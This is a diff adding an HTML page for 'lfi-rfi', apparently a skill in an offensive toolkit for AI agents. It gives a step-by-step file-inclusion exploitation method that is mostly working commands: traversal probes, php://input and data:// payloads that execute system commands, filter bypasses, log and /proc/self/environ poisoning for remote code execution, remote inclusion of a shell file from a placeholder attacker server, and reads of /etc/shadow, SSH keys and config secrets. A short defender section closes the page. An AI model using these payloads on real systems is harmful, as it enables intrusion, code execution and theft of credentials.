@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: lfi-rfi</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>lfi-rfi</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing a web application for Local and Remote File</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a> <a href="web-sqli.html">web-sqli</a> <a href="ssrf.html">ssrf</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>ffuf</td><td>2.1.0</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>File inclusion happens when a <code>page</code>, <code>file</code>, <code>template</code>, or <code>lang</code> parameter is passed to a file read or include function without checks. Local File Inclusion reads server files; Remote File Inclusion pulls code from an attacker server. This skill covers the full authorized methodology: traversal probes, wrapper abuse, filter bypasses, and escalation to code execution. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Find parameters that name a file: <code>page=</code>, <code>file=</code>, <code>template=</code>,</li>
+<p><code>lang=</code>, <code>view=</code>, <code>doc=</code>, and route segments like <code>/pages/about</code>.</p>
+<li>Probe with path traversal (<code>../../../../etc/passwd</code>) and watch for</li>
+<p>file content in the response.</p>
+<li>Test PHP wrappers: <code>php://filter</code> for source disclosure,</li>
+<p><code>php://input</code> and <code>data://</code> for code execution.</p>
+<li>Bypass traversal filters with encoding, doubling, absolute paths,</li>
+<p>and truncation tricks.</p>
+<li>Escalate LFI to RCE via log poisoning, /proc/self/environ, PHP</li>
+<p>sessions, or uploaded files.</p>
+<li>Test RFI by pointing the parameter at your server when URL includes</li>
+<p>look enabled.</p>
+<li>Fuzz the parameter with a traversal wordlist for hidden behaviors.</li>
+<li>Record the exact payload and every file read or command run.</li>
+</ol>
+<h2>1. Path traversal detection</h2>
+<p>Start simple. Walk up the tree and look for <code>/etc/passwd</code> content.</p>
+<pre><code class="language-bash"># Basic traversal ladder: increase depth until the app root is escaped
+for d in 1 2 3 4 5 6 7 8; do
+  trav=$(printf &#x27;../%.0s&#x27; $(seq 1 $d))
+  out=$(curl -s &quot;https://target.example/page?file=${trav}etc/passwd&quot;)
+  if echo &quot;$out&quot; | grep -q &#x27;root:&#x27;; then echo &quot;depth $d works&quot;; break; fi
+done</code></pre>
+<pre><code class="language-bash"># Absolute path test (works when the app prepends nothing or strips ../)
+curl -s &#x27;https://target.example/page?file=/etc/passwd&#x27; | grep -c &#x27;root:&#x27;
+
+# Windows targets
+curl -s &#x27;https://target.example/page?file=../../../../windows/win.ini&#x27; \
+  | grep -c &#x27;for 16-bit app support&#x27;</code></pre>
+<pre><code class="language-bash"># Fuzz with a traversal wordlist for filter quirks and odd parameters
+ffuf -u &#x27;https://target.example/page?file=FUZZ&#x27; \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -mr &#x27;root:&#x27; -t 20 -p 0.2</code></pre>
+<p>A hit on <code>root:</code> is confirmed LFI. Note whether the file content is rendered as HTML (view-source to see it raw) or stripped.</p>
+<h2>2. PHP wrapper abuse</h2>
+<p>On PHP targets, wrappers turn a file read into source disclosure or code execution.</p>
+<pre><code class="language-bash"># php://filter: read PHP source as base64 (avoids the code executing)
+curl -s &#x27;https://target.example/page?file=php://filter/convert.base64-encode/resource=index&#x27; \
+  | grep -o &#x27;[A-Za-z0-9+/=]\{200,\}&#x27; | head -1 &gt; /tmp/b64.txt
+# decode: base64 -d /tmp/b64.txt | head -50</code></pre>
+<pre><code class="language-bash"># php://filter with a full path
+curl -s --get &#x27;https://target.example/page&#x27; \
+  --data-urlencode &#x27;file=php://filter/convert.base64-encode/resource=/var/www/html/config.php&#x27; \
+  | grep -o &#x27;[A-Za-z0-9+/=]\{200,\}&#x27; | head -1</code></pre>
+<pre><code class="language-bash"># php://input: POST your PHP code, the wrapper executes it on include
+# (only when the include actually executes the stream)
+curl -s -X POST &#x27;https://target.example/page?file=php://input&#x27; \
+  -d &#x27;&lt;?php echo &quot;PWNED:&quot;; system(&quot;id&quot;); ?&gt;&#x27; | grep -o &#x27;PWNED:[^&lt;]*&#x27; | head -1</code></pre>
+<pre><code class="language-bash"># data:// wrapper: no outbound request needed (RFI without a server)
+curl -s --get &#x27;https://target.example/page&#x27; \
+  --data-urlencode &#x27;file=data://text/plain,&lt;?php echo &quot;PWNED:&quot;; system(&quot;id&quot;); ?&gt;&#x27; \
+  | grep -o &#x27;PWNED:[^&lt;]*&#x27; | head -1
+
+# data:// base64 variant (dodges quote filters)
+curl -s --get &#x27;https://target.example/page&#x27; \
+  --data-urlencode &#x27;file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==&#x27; \
+  | grep -o &#x27;uid=[0-9]*&#x27; | head -1</code></pre>
+<p>Other wrappers worth one probe each: <code>zip://</code> (include a file inside an uploaded zip), <code>phar://</code> (PHP archives, deserialization plus include), and <code>expect://</code> (almost always disabled, but one quick test is cheap).</p>
+<h2>3. Filter bypasses</h2>
+<p>Filters usually strip <code>../</code> once or blocklist keywords. Bypass with:</p>
+<pre><code class="language-bash"># Double traversal: filter strips one &quot;../&quot;, leaving another
+# ....//....//etc/passwd  -&gt;  ../../etc/passwd after one strip pass
+curl -s &#x27;https://target.example/page?file=....//....//etc/passwd&#x27; | grep -c &#x27;root:&#x27;
+
+# Double URL encoding: filter decodes once, app decodes twice
+# %252e%252e%252fetc%252fpasswd
+curl -s &#x27;https://target.example/page?file=%252e%252e%252fetc%252fpasswd&#x27; | grep -c &#x27;root:&#x27;
+
+# Mixed encoding
+curl -s &#x27;https://target.example/page?file=..%2f..%2fetc%2fpasswd&#x27; | grep -c &#x27;root:&#x27;
+
+# Backslashes on Windows, and mixed slashes
+curl -s &#x27;https://target.example/page?file=..%5c..%5cwindows%5cwin.ini&#x27; | grep -c &#x27;16-bit&#x27;
+
+# Appended extension bypass: app adds &quot;.php&quot;, so break out of it
+# file=../../etc/passwd%00        (null byte, PHP &lt; 5.3.4 only)
+# file=../../etc/passwd/.         (trailing /. tricks the extension check)
+# file=....//....//etc/passwd/./  (keep the suffix harmless)
+curl -s &#x27;https://target.example/page?file=../../../../etc/passwd/.&#x27; | grep -c &#x27;root:&#x27;</code></pre>
+<pre><code class="language-bash"># If the app requires the path to start with a directory, keep the
+# prefix and traverse after it:
+# file=pages/../../../../etc/passwd
+curl -s &#x27;https://target.example/page?file=pages/../../../../etc/passwd&#x27; | grep -c &#x27;root:&#x27;</code></pre>
+<p>Automate bypass rotation with Burp Intruder or a small loop, testing each variant and grepping for <code>root:</code>.</p>
+<h2>4. LFI to RCE: log poisoning</h2>
+<p>If you can write attacker-controlled text into a file the LFI can read (logs, sessions), the include executes it.</p>
+<pre><code class="language-bash"># Step 1: poison the access log with PHP via the User-Agent
+curl -s -A &#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27; &#x27;https://target.example/&#x27; -o /dev/null
+
+# Step 2: include the log file
+curl -s --get &#x27;https://target.example/page&#x27; \
+  --data-urlencode &#x27;file=/var/log/apache2/access.log&#x27; | grep -o &#x27;uid=[0-9]*&#x27; | head -1</code></pre>
+<p>Common log paths to try: <code>/var/log/apache2/access.log</code>, <code>/var/log/httpd/access_log</code>, <code>/var/log/nginx/access.log</code>, <code>/var/log/auth.log</code> (via SSH username poisoning). If the log path is unknown, read <code>/proc/self/fd/</code> or <code>/proc/self/environ</code> through the LFI itself to discover it.</p>
+<pre><code class="language-bash"># /proc/self/environ often contains the User-Agent: poison it the same way
+curl -s -A &#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27; &#x27;https://target.example/&#x27; -o /dev/null
+curl -s --get &#x27;https://target.example/page&#x27; \
+  --data-urlencode &#x27;file=/proc/self/environ&#x27; | grep -o &#x27;uid=[0-9]*&#x27; | head -1</code></pre>
+<p>PHP session poisoning: if you control a session value (username, language preference), find the session file (<code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code>) and include it.</p>
+<p>Mail poisoning and other writable files follow the same pattern: any file you can write plus any LFI that includes it equals code execution.</p>
+<h2>5. Remote File Inclusion</h2>
+<p>RFI needs <code>allow_url_include=On</code> (rare on modern PHP, common on old targets). Test quickly.</p>
+<pre><code class="language-bash"># Host a harmless PHP file on your server, then:
+curl -s --get &#x27;https://target.example/page&#x27; \
+  --data-urlencode &#x27;file=http://YOUR-SERVER/shell.txt&#x27; | head -c 300
+# Watch your server log: a hit means the target fetched it (SSRF at
+# minimum). If your PHP executed, it is full RFI.</code></pre>
+<pre><code class="language-bash"># Bypass attempts when &quot;http&quot; is blocklisted but wrappers are not
+# file=\\YOUR-SERVER\share\shell.txt   (SMB wrapper, Windows PHP)</code></pre>
+<p>If RFI fails but the target fetches the URL without executing it, treat it as SSRF (see the ssrf skill) and pivot to internal targets instead.</p>
+<h2>6. Reading without execution</h2>
+<p>Sometimes you only get file reads. Make them count:</p>
+<pre><code class="language-bash"># Linux enumeration through LFI (authorized targets, read-only)
+/etc/passwd                 # users
+/etc/shadow                 # hashes (needs privileges, try anyway)
+/etc/hosts /etc/hostname    # network context
+/proc/self/cmdline          # how the app runs
+/proc/self/environ           # secrets in env vars
+/var/www/html/config.php     # via php://filter, app secrets
+~/.ssh/id_rsa                # developer keys (long shot, big win)
+/var/log/apache2/access.log  # confirm log paths for poisoning</code></pre>
+<pre><code class="language-bash"># Pull several files in one loop once traversal is confirmed
+for f in /etc/passwd /etc/hosts /proc/self/cmdline; do
+  echo &quot;=== $f ===&quot;
+  curl -s --get &#x27;https://target.example/page&#x27; \
+    --data-urlencode &quot;file=../../../../..$f&quot; | head -c 300
+  echo
+done</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>The application appends <code>.php</code> or a base path: combine the prefix</li>
+<p>keep (<code>pages/...</code>) with suffix neutralization (<code>/.</code> or <code>%00</code> on old PHP).</p>
+<li><code>php://filter</code> returns base64 but the page truncates long output:</li>
+<p>read the file in chunks or target smaller files first.</p>
+<li>The traversal works but the response is a download: check</li>
+<p>Content-Disposition; the file content is in the body, just save it.</p>
+<li>open_basedir restrictions: PHP may allow <code>/var/www/</code> but not <code>/etc</code>;</li>
+<p>enumerate inside the allowed tree (config files, uploaded files).</p>
+<li>The parameter is used in an <code>include</code> but output buffering eats</li>
+<p>errors: a blank page with a 200 can still mean the include ran; use a marker string (<code>echo &quot;MARKER&quot;</code>) to confirm execution.</p>
+<li>Nginx/Apache path normalization strips <code>../</code> before the app sees it:</li>
+<p>try absolute paths and encoded variants that survive one decode.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>LFI confirmed but no wrapper works: fall back to log poisoning with</li>
+<p>plain traversal, which needs no wrapper at all.</p>
+<li>Logs are not readable (permissions): try PHP session files, uploaded</li>
+<p>avatars (upload a GIF with PHP code, include it), or the <code>/proc/self/fd/N</code> descriptors of already-open files.</p>
+<li><code>data://</code> blocked but <code>php://input</code> open: POST the payload instead.</li>
+<li>Both blocked: check <code>zip://</code> against an uploaded zip, and <code>phar://</code></li>
+<p>against an uploaded phar (phar also enables deserialization chains).</p>
+<li>No code execution possible: a read-only LFI still yields configs,</li>
+<p>secrets, and source code; pivot to credential reuse and source review rather than forcing RCE.</p>
+<li>RFI blocked at the network layer: the outbound fetch attempt still</li>
+<p>proves SSRF; use it for internal recon per the ssrf skill.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see file inclusion as traversal sequences (<code>../</code>, encoded dots) and wrapper schemes (<code>php://</code>, <code>data://</code>) in request parameters, followed by reads of files outside the web root or outbound fetches to odd hosts. Web logs showing <code>file=/etc/passwd</code> are unmistakable. Poisoning shows up as PHP code in User-Agent strings inside access logs. The durable fixes are an allow-list of includable files (never build paths from user input), <code>allow_url_include=Off</code>, <code>open_basedir</code> restrictions, storing uploads outside the web root without execute permission, and not logging raw User-Agent strings into files that any include can reach. Containerize or chroot the app so a traversal cannot reach host secrets.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the</li>
+<p>inclusion point.</p>
+<li>MITRE ATT&amp;CK T1059 (Command and Scripting Interpreter): post-include</li>
+<p>command execution.</p>
+<li>MITRE ATT&amp;CK T1552.001 (Unsecured Credentials: Credentials In</li>
+<p>Files): config and key theft.</p>
+<li>CWE-98 (Improper Control of Filename for Include/Require Statement</li>
+<p>in PHP Program, PHP Remote File Inclusion).</p>
+<li>CWE-22 (Improper Limitation of a Pathname to a Restricted Directory,</li>
+<p>Path Traversal).</p>
+<li>OWASP Testing Guide: Testing for Local File Inclusion,</li>
+<p>Testing for Remote File Inclusion.</p>
+<li>PortSwigger Web Security Academy: File inclusion and path traversal</li>
+<p>labs.</p>
+<li>PHP manual: php:// wrappers and allow_url_include.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
